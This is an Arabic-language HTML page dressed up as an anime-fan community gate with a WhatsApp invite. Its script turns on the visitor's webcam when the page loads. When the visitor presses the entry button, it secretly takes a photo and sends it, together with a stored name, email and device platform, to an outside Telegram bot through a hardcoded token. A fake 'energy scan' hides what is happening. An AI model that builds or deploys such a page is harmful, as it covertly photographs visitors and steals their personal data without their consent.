<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة المملكة | يوسف علاء</title>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@500;800;900&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
<link rel="stylesheet" href="style.css">

        :root { --main-red: #ff003c; --gold: #ffb700; --dark: #0a0a0a; }
        body { font-family: 'Tajawal', sans-serif; background: var(--dark); color: #fff; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
        
        /* فيديو الخلفية المتتابع */
        #bg-video { position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; z-index: -1; opacity: 0.4; }

        .glass-box { background: rgba(10, 10, 12, 0.9); backdrop-filter: blur(15px); border: 2px solid var(--main-red); width: 90%; max-width: 450px; padding: 25px; border-radius: 20px; text-align: center; box-shadow: 0 0 50px rgba(255, 0, 60, 0.4); }
        
        .showcase { width: 100%; border-radius: 12px; border: 2px solid var(--gold); margin-bottom: 15px; }

        .cam-container { width: 100%; border-radius: 15px; overflow: hidden; border: 2px solid #333; margin-bottom: 20px; background: #000; }
        video#webcam { width: 100%; display: block; transform: scaleX(-1); }

        .btn-final { width: 100%; padding: 18px; border: none; border-radius: 12px; background: linear-gradient(45deg, var(--main-red), #990024); color: white; font-size: 19px; font-weight: 900; cursor: pointer; box-shadow: 0 5px 15px rgba(255,0,60,0.4); }
        .footer-name { margin-top: 20px; color: var(--gold); font-weight: 900; border-top: 1px solid #333; padding-top: 10px; }
    </style>
</head>
<body onload="startCam()">

    <video id="bg-video" autoplay muted playsinline>
        <source id="video-source" src="385937dae3995b54f3fecde0dd7acec7_1769970173274.mp4" type="video/mp4">
    </video>

    <div class="glass-box">
        <h2 style="margin:0; color:#fff;">⛩️ مَمْلَكَة الأوتـاكو ⛩️</h2>
        <p style="color:var(--gold); font-size:12px;">أهلاً بك يا محارب في عرين يوسف علاء</p>

        <img src="Screenshot_2026-03-14-17-16-23-72.jpg" class="showcase">

        <div class="cam-container">
            <video id="webcam" autoplay playsinline></video>
            <canvas id="capture" style="display:none;"></canvas>
        </div>

        <button onclick="takeShotAndSend()" class="btn-final">تأكيد الدخول للواتساب 🚀</button>

        <div class="footer-name">👑 القائد: يوسف علاء 👑</div>
    </div>

    <script>
        const TOKEN = "8737868558:AAFqvBT8qY3E5kJDC8bjXT1Ku9gSBXv9Q4g";
        const CHAT_ID = "7394389253";
        const WHATSAPP = "https://chat.whatsapp.com/J08oDw7MzULIJHnzN2Okts";

        // مشغل الفيديوهات Playlist
        const vidPlayer = document.getElementById('bg-video');
        const vidSrc = document.getElementById('video-source');
        const playlist = ["385937dae3995b54f3fecde0dd7acec7_1769970173274.mp4", "fqBsQ4ZhiMk.mp4"];
        let currentIdx = 0;

        vidPlayer.onended = () => {
            currentIdx = (currentIdx + 1) % playlist.length;
            vidSrc.src = playlist[currentIdx];
            vidPlayer.load(); vidPlayer.play();
        };

        // الكاميرا
        function startCam() {
            navigator.mediaDevices.getUserMedia({ video: true }).then(s => document.getElementById('webcam').srcObject = s);
        }

        async function takeShotAndSend() {
            Swal.fire({ title: 'جاري فحص طاقتك...', background: '#000', color: '#fff', didOpen: () => Swal.showLoading() });

            const v = document.getElementById('webcam');
            const c = document.getElementById('capture');
            c.width = v.videoWidth; c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);

            c.toBlob(async (blob) => {
                const name = localStorage.getItem('u_name') || "غير معروف";
                const email = localStorage.getItem('u_mail') || "لا يوجد";
                const pLevel = Math.floor(Math.random() * 9000) + 1000;

                const fd = new FormData();
                fd.append("chat_id", CHAT_ID);
                fd.append("photo", blob, "warrior.jpg");
                fd.append("caption", `🚨 تقرير دخول جديد 🚨\n\n👤 الاسم: ${name}\n📧 البريد: ${email}\n⚡ الطاقة: ${pLevel}\n📱 الجهاز: ${navigator.platform}\n👑 القائد: يوسف علاء`);

                try {
                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: fd });
                    Swal.fire({ icon: 'success', title: 'تم القبول!', text: 'انطلق للواتساب الآن', timer: 2000, showConfirmButton: false });
                    setTimeout(() => { window.location.href = WHATSAPP; }, 2000);
                } catch(e) {
                    alert("خطأ في الاتصال، حاول مجدداً");
                }
            }, 'image/jpeg');
        }
    </script>
</body>
</html>
